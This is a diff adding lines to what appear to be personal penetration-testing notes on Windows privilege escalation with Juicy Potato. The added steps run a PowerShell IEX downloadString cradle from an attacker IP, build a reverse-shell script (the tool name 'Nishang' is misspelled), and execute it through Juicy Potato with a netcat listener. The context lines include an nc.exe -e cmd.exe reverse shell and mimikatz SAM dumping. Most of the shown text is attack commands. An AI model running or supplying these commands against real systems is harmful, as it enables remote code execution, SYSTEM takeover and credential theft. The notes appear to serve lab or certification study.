@@ -295,10 +295,21 @@ Pattern
                     token::elevate
                     lsadump::sam
          4.2.4 Juicy Potato   - Golden privilege
+            https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/
+            https://github.com/ivanitlearning/Juicy-Potato-x86/releases for x86
+            
                 whoami /all
                 check     SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
                 https://github.com/ivanitlearning/Juicy-Potato-x86/releases/download/1.2/Juicy.Potato.x86.exe
                 https://eternallybored.org/misc/netcat/
+                Create a bat file
+                  powershell "IEX(New-Object Net.Webclient).downloadString('http//192.168.119.131/rev_4444.ps1)"
+                Create a reverse shell using nisheng and name it rev_4444.ps1
+                Execute the bat file using Juicy Potato
+                  jp86.exe -t * -p C:\wamp\www\PHP\1\fileManager\collectives\DG0\hackme\see.bat -l 9001
+                  host: rlwrap -r nc -nlvp 4444
+                
+
                 Place Juicy Potato and netcat on the target computer. 
                 JuicyPotato -l 1337 -p c:\windows\system32\cmd.exe -a "/c C:\wamp\www\PHP\1\fileManager\collectives\DG0\hackme\nc.exe -e cmd.exe 10.10.10.12 443" -t
                 Host: rlwrap -r nc -nlvp 
